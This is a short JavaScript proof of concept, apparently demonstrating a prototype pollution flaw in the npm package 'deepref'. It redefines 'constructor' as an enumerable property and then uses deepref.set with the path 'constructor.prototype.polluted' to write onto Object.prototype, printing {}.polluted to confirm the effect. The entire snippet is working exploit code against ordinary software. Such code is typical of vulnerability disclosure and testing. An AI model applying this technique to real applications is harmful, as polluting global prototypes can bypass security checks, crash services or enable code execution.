var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
console.log({}.polluted);
const deepref = require('deepref');
deepref.set(obj, 'constructor.prototype.polluted', 'yes');
console.log({}.polluted);